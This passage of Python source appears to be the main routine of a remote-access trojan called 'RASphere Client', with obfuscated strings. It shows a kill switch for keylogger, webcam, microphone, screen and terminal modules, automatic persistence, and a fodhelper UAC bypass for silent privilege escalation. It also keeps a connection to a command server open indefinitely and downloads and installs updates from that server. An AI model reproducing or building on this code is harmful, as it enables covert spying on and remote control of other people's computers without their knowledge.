        sio.emit(_D("_s537"), result)
    @sio.on(_D("_s538"))
    def _ks(d=None):
        _l.warning(_D("_s539")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
def main():
    p = argparse.ArgumentParser(description=_D("_s540"))
    p.add_argument(_D("_s541"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s542"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s543"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s544"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s545"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s546"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s547"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s548"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s549"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
        if _up(): print(_D("_s550"))
        else: print(_D("_s551"))
        return
    if args.install:
        if not url or not secret: print(_D("_s552")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s553"))
        else: print(_D("_s554"))
    if sys.platform == _D("_s555") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s556"))
            _fodhelper_uac_bypass(args)
            print(_D("_s557"))
        else:
            _l.info(_D("_s558"))
    if getattr(args, _D("_s559"), False):
        _l.info(_D("_s560"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s561"))
                else: print(_D("_s562"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s563")); sys.exit(1)
    if not secret: print(_D("_s564")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s565"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s566"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s567")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s568"))
if __name__ == _D("_s569"): main()
